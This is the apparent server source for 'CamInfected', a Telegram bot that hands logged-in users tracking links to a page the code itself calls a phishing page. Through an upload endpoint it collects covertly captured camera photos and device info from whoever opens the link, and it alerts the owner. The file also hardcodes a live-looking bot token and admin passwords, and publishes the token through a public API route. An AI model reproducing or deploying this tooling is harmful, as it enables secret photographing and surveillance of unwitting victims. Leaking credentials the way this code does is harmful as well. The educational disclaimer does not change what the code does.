// 🚀 bot.js – FINAL WORKING VERSION (Railway / Render compatible)
const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const TelegramBot = require('node-telegram-bot-api');
const sqlite3 = require('sqlite3').verbose();
const { open } = require('sqlite');

// ------------------- FORCE DATABASE RESET (fresh start every restart) -------------------
const DB_PATH = './caminfected.db';
if (fs.existsSync(DB_PATH)) {
  fs.unlinkSync(DB_PATH);
  console.log('🗑️ Old database deleted – fresh start');
}

// ------------------- CONFIGURATION -------------------
const BOT_TOKEN = '8879628119:AAF_mRJarxire4chz2Q6J353dlSLKaiTHRo';   // Your bot token
const OWNER_CHAT_ID = '8678824835';
const ADMIN_PASSWORD = 'admin@alamin#4045034';
const USER_PASSWORD = 'owner@mrvirus460#alamin';
const PORT = process.env.PORT || 3000;
const BASE_URL = 'https://caminfected460a.up.railway.app';  // Your railway URL

// ------------------- EXPRESS SETUP -------------------
const app = express();
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve the HTML page (make sure index.html exists)
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});
app.get('/favicon.ico', (req, res) => res.status(204).end());

// ------------------- SQLite DATABASE -------------------
let db;

async function initDatabase() {
  db = await open({ filename: DB_PATH, driver: sqlite3.Database });

  // Users table
  await db.exec(`
    CREATE TABLE IF NOT EXISTS users (
      chatId TEXT PRIMARY KEY,
      username TEXT,
      firstName TEXT,
      lastName TEXT,
      isApproved INTEGER DEFAULT 0,
      isBlocked INTEGER DEFAULT 0,
      isAdmin INTEGER DEFAULT 0,
      referralCode TEXT,
      createdAt DATETIME DEFAULT CURRENT_TIMESTAMP,
      lastActive DATETIME DEFAULT CURRENT_TIMESTAMP,
      totalLinks INTEGER DEFAULT 0,
      totalPhotos INTEGER DEFAULT 0
    )
  `);

  // Photos table
  await db.exec(`
    CREATE TABLE IF NOT EXISTS photos (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      chatId TEXT,
      userChatId TEXT,
      photoId TEXT,
      fileId TEXT,
      caption TEXT,
      deviceInfo TEXT,
      timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
    )
  `);

  // Logs table
  await db.exec(`
    CREATE TABLE IF NOT EXISTS logs (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      chatId TEXT,
      action TEXT,
      details TEXT,
      timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
    )
  `);

  // Insert or update owner as admin
  const owner = await db.get('SELECT * FROM users WHERE chatId = ?', [OWNER_CHAT_ID]);
  if (!owner) {
    const crypto = require('crypto');
    const ref = crypto.createHash('md5').update(OWNER_CHAT_ID + Date.now()).digest('hex').substring(0, 10);
    await db.run(
      'INSERT INTO users (chatId, username, firstName, isApproved, isAdmin, referralCode) VALUES (?, ?, ?, 1, 1, ?)',
      [OWNER_CHAT_ID, 'owner', 'Owner', ref]
    );
  } else {
    await db.run('UPDATE users SET isApproved = 1, isAdmin = 1 WHERE chatId = ?', [OWNER_CHAT_ID]);
  }

  console.log('✅ Database ready');
  console.log(`👑 Owner: ${OWNER_CHAT_ID}`);
}

function generateReferralCode(chatId) {
  const crypto = require('crypto');
  return crypto.createHash('md5').update(chatId + Date.now()).digest('hex').substring(0, 10);
}

async function logActivity(chatId, action, details = {}) {
  try {
    await db.run('INSERT INTO logs (chatId, action, details) VALUES (?, ?, ?)',
      [chatId, action, JSON.stringify(details)]);
  } catch (e) {}
}

async function isAdmin(chatId) {
  const user = await db.get('SELECT isAdmin FROM users WHERE chatId = ?', [chatId]);
  return user?.isAdmin === 1;
}

// ------------------- TELEGRAM BOT (polling) -------------------
const bot = new TelegramBot(BOT_TOKEN, { polling: true });
console.log('🤖 Bot started (polling mode)');

// ------------------- COMMAND HANDLERS -------------------

// /start – register user (FIXED: using HTML parse_mode)
bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id.toString();
  try {
    console.log(`/start called for ${chatId}`);
    const user = await db.get('SELECT * FROM users WHERE chatId = ?', [chatId]);
    if (!user) {
      const ref = generateReferralCode(chatId);
      await db.run(
        'INSERT INTO users (chatId, username, firstName, lastName, referralCode) VALUES (?, ?, ?, ?, ?)',
        [chatId, msg.from?.username || '', msg.from?.first_name || '', msg.from?.last_name || '', ref]
      );
      console.log(`New user created: ${chatId}`);
    }

    const welcomeHTML = `
🎉 <b>Welcome to CamInfected Bot!</b> 🎉

<pre>----------------------------------------</pre>
📸 <b>CamInfected v2.5.7</b>
<pre>----------------------------------------</pre>

⚠️ <b>Warning:</b> This system is made only for research 🔬 and educational purposes! Using this system for any malicious activity is strictly prohibited 🚫 The developer is not responsible for any adverse situations!

<pre>----------------------------------------</pre>
🔐 <b>Login Password:</b> <code>Contact admin to get user password!</code>
👑 <b>Admin Password:</b> <code>not for you! </code>

📌 <b>Available Commands:</b>
├─ /login password – Login
├─ /getlink – Get target link
├─ /myphotos – View photos
├─ /mystatus – Check status
└─ /help – Help

<pre>----------------------------------------</pre>
👨‍💻 Developer: Mohammad Alamin
📱 TikTok: @mr_virus_apk
📨 Telegram: @mrvirus460
`;

    await bot.sendMessage(chatId, welcomeHTML, { parse_mode: 'HTML' });
    console.log(`/start successful for ${chatId}`);
  } catch (err) {
    console.error('Start error details:', err);
    await bot.sendMessage(chatId, '❌ Server error! Please try again.');
    // Fallback plain text
    try {
      await bot.sendMessage(chatId, '🎉 Welcome to CamInfected Bot!\n\nPlease run /start again.');
    } catch (e) {}
  }
});

// /login – user/admin authentication
bot.onText(/\/login (.+)/, async (msg, match) => {
  const chatId = msg.chat.id.toString();
  const password = match[1];
  try {
    const user = await db.get('SELECT * FROM users WHERE chatId = ?', [chatId]);
    if (!user) return bot.sendMessage(chatId, '❌ Please run /start first.');

    if (user.isBlocked) {
      return bot.sendMessage(chatId, '❌ *You have been blocked!* Contact: @mrvirus460', { parse_mode: 'Markdown' });
    }

    if (password === ADMIN_PASSWORD) {
      await db.run('UPDATE users SET isApproved = 1, isAdmin = 1, lastActive = CURRENT_TIMESTAMP WHERE chatId = ?', [chatId]);
      await logActivity(chatId, 'admin_login');
      await bot.sendMessage(chatId, `✅ *Admin login successful!*

🔗 *Your Link:* ${BASE_URL}/?chat_id=${chatId}
👑 *Admin Panel:* /admin
📸 *View Photos:* /myphotos`, { parse_mode: 'Markdown' });
    } 
    else if (password === USER_PASSWORD) {
      await db.run('UPDATE users SET isApproved = 1, lastActive = CURRENT_TIMESTAMP WHERE chatId = ?', [chatId]);
      await logActivity(chatId, 'user_login');
      await bot.sendMessage(chatId, `✅ *Login successful!*

🔗 *Your Target Link:* ${BASE_URL}/?chat_id=${chatId}
🔗 *New Link:* /getlink
📸 *View Photos:* /myphotos`, { parse_mode: 'Markdown' });
    } 
    else {
      await bot.sendMessage(chatId, '❌ *Wrong password!* Contact: @mrvirus460', { parse_mode: 'Markdown' });
      await logActivity(chatId, 'failed_login', { attempt: password });
    }
  } catch (err) {
    console.error('Login error:', err);
    await bot.sendMessage(chatId, '❌ Error!');
  }
});

// /getlink – generate target link (ONLY after login)
bot.onText(/\/getlink/, async (msg) => {
  const chatId = msg.chat.id.toString();
  try {
    const user = await db.get('SELECT * FROM users WHERE chatId = ?', [chatId]);
    if (!user) return bot.sendMessage(chatId, '❌ Run /start first.');
    if (user.isApproved !== 1) {
      return bot.sendMessage(chatId, '❌ *You are not logged in!* Run /login.', { parse_mode: 'Markdown' });
    }
    if (user.isBlocked) return bot.sendMessage(chatId, '❌ You are blocked!');

    const link = `${BASE_URL}/?chat_id=${chatId}`;
    await db.run('UPDATE users SET totalLinks = totalLinks + 1, lastActive = CURRENT_TIMESTAMP WHERE chatId = ?', [chatId]);
    await logActivity(chatId, 'link_generated');
    await bot.sendMessage(chatId, `🔗 *Your Target Link:*\n\`${link}\`\n\n⚠️ Use only for educational purposes.`, { parse_mode: 'Markdown' });
  } catch (err) {
    console.error('Getlink error:', err);
    await bot.sendMessage(chatId, '❌ Error!');
  }
});

// /myphotos – show captured photos
bot.onText(/\/myphotos/, async (msg) => {
  const chatId = msg.chat.id.toString();
  try {
    const user = await db.get('SELECT * FROM users WHERE chatId = ?', [chatId]);
    if (!user || user.isApproved !== 1) return bot.sendMessage(chatId, '❌ Please login first!');
    if (user.isBlocked) return bot.sendMessage(chatId, '❌ Blocked!');

    const photos = await db.all('SELECT * FROM photos WHERE userChatId = ? ORDER BY timestamp DESC LIMIT 20', [chatId]);
    if (!photos.length) return bot.sendMessage(chatId, '📸 No photos yet.');

    await bot.sendMessage(chatId, `📸 *Your latest ${photos.length} photos:*`, { parse_mode: 'Markdown' });
    for (const p of photos) {
      try {
        await bot.sendPhoto(chatId, p.fileId, { caption: `🖼️ ${p.photoId}\n⏰ ${new Date(p.timestamp).toLocaleString('en-US')}` });
      } catch (e) {}
    }
  } catch (err) {
    await bot.sendMessage(chatId, '❌ Error!');
  }
});

// /mystatus – show user stats
bot.onText(/\/mystatus/, async (msg) => {
  const chatId = msg.chat.id.toString();
  try {
    const user = await db.get('SELECT * FROM users WHERE chatId = ?', [chatId]);
    if (!user) return bot.sendMessage(chatId, '❌ Run /start first.');
    const stats = {
      totalPhotos: (await db.get('SELECT COUNT(*) as c FROM photos WHERE userChatId = ?', [chatId]))?.c || 0,
      totalLinks: user.totalLinks || 0
    };
    await bot.sendMessage(chatId, `📊 *Status*\n✅ Status: ${user.isApproved ? 'Active' : 'Inactive'}\n👑 Admin: ${user.isAdmin ? 'Yes' : 'No'}\n📸 Total Photos: ${stats.totalPhotos}\n🔗 Total Links: ${stats.totalLinks}`, { parse_mode: 'Markdown' });
  } catch (err) {}
});

// /help – list commands
bot.onText(/\/help/, async (msg) => {
  const isAdminUser = await isAdmin(msg.chat.id.toString());
  let text = `📌 *Command List*\n/login password – Login\n/getlink – Get target link\n/myphotos – View photos\n/mystatus – Check status\n/help – Help\n👨‍💻 @mrvirus460`;
  if (isAdminUser) {
    text += `\n\n👑 *Admin Commands*\n/admin – Panel\n/users – User list\n/block [chatId] – Block\n/unblock [chatId] – Unblock\n/stats – Detailed statistics`;
  }
  await bot.sendMessage(msg.chat.id, text, { parse_mode: 'Markdown' });
});

// ------------------- ADMIN PANEL -------------------
bot.onText(/\/admin/, async (msg) => {
  const chatId = msg.chat.id.toString();
  if (!(await isAdmin(chatId))) return bot.sendMessage(chatId, '❌ You are not an admin!');
  const totalUsers = await db.get('SELECT COUNT(*) as c FROM users');
  const totalPhotos = await db.get('SELECT COUNT(*) as c FROM photos');
  await bot.sendMessage(chatId, `👑 *Admin Panel*\n👥 Total Users: ${totalUsers.c}\n📸 Total Photos: ${totalPhotos.c}\n\n/users – List\n/block [id] – Block\n/unblock [id] – Unblock`, { parse_mode: 'Markdown' });
});

bot.onText(/\/users/, async (msg) => {
  const chatId = msg.chat.id.toString();
  if (!(await isAdmin(chatId))) return;
  const users = await db.all('SELECT chatId, firstName, isApproved, isAdmin, isBlocked FROM users ORDER BY createdAt DESC');
  let list = '👥 *User List*\n━━━━━━━━━━━━━━━━━━━━\n';
  for (const u of users) {
    list += `🆔 ${u.chatId}\n👤 ${u.firstName || 'N/A'}\n✅ ${u.isApproved ? '✓' : '✗'} | 👑 ${u.isAdmin ? '✓' : '✗'} | 🔒 ${u.isBlocked ? '🔴' : '⚪'}\n━━━━━━━━━━━━━━━━━━━━\n`;
  }
  await bot.sendMessage(chatId, list, { parse_mode: 'Markdown' });
});

bot.onText(/\/block (.+)/, async (msg, match) => {
  const chatId = msg.chat.id.toString();
  if (!(await isAdmin(chatId))) return;
  const target = match[1];
  await db.run('UPDATE users SET isApproved = 0, isBlocked = 1 WHERE chatId = ?', [target]);
  await bot.sendMessage(chatId, `✅ Blocked: ${target}`);
  await bot.sendMessage(target, `❌ *You have been blocked!* Contact: @mrvirus460`, { parse_mode: 'Markdown' });
});

bot.onText(/\/unblock (.+)/, async (msg, match) => {
  const chatId = msg.chat.id.toString();
  if (!(await isAdmin(chatId))) return;
  const target = match[1];
  await db.run('UPDATE users SET isApproved = 1, isBlocked = 0 WHERE chatId = ?', [target]);
  await bot.sendMessage(chatId, `✅ Unblocked: ${target}`);
  await bot.sendMessage(target, `✅ *You have been unblocked!* Run /login`, { parse_mode: 'Markdown' });
});

bot.onText(/\/stats/, async (msg) => {
  const chatId = msg.chat.id.toString();
  if (!(await isAdmin(chatId))) return;
  const totalUsers = await db.get('SELECT COUNT(*) as c FROM users');
  const approved = await db.get('SELECT COUNT(*) as c FROM users WHERE isApproved=1');
  const blocked = await db.get('SELECT COUNT(*) as c FROM users WHERE isBlocked=1');
  const photos = await db.get('SELECT COUNT(*) as c FROM photos');
  const today = await db.get("SELECT COUNT(*) as c FROM photos WHERE date(timestamp) = date('now')");
  await bot.sendMessage(chatId, `📊 *Detailed Statistics*\n👥 Total Users: ${totalUsers.c}\n✅ Approved: ${approved.c}\n🔴 Blocked: ${blocked.c}\n📸 Total Photos: ${photos.c}\n📸 Today's Photos: ${today.c || 0}`, { parse_mode: 'Markdown' });
});

// ------------------- API ENDPOINTS (for the phishing page) -------------------
app.get('/api/bot-info', (req, res) => {
  res.json({ botToken: BOT_TOKEN, ownerChatId: OWNER_CHAT_ID, baseUrl: BASE_URL });
});

app.post('/api/upload-photo', async (req, res) => {
  const { chatId, photoId, fileId, caption, deviceInfo } = req.body;
  if (!chatId || !photoId || !fileId) return res.status(400).json({ error: 'Missing fields' });

  try {
    await db.run(
      'INSERT INTO photos (chatId, userChatId, photoId, fileId, caption, deviceInfo) VALUES (?, ?, ?, ?, ?, ?)',
      [chatId, chatId, photoId, fileId, caption || '', JSON.stringify(deviceInfo || {})]
    );
    await db.run('UPDATE users SET totalPhotos = totalPhotos + 1 WHERE chatId = ?', [chatId]);
    await bot.sendMessage(OWNER_CHAT_ID, `📸 *New Photo!*\n🆔 ${chatId}\n📸 ${photoId}\n⏰ ${new Date().toLocaleString('en-US')}`, { parse_mode: 'Markdown' });
    res.json({ success: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Database error' });
  }
});

app.get('/api/health', (req, res) => res.json({ status: 'ok' }));

// ------------------- START SERVER -------------------
async function start() {
  await initDatabase();
  app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Server running at ${BASE_URL}`);
    console.log(`🤖 Bot active`);
  });
}

start();
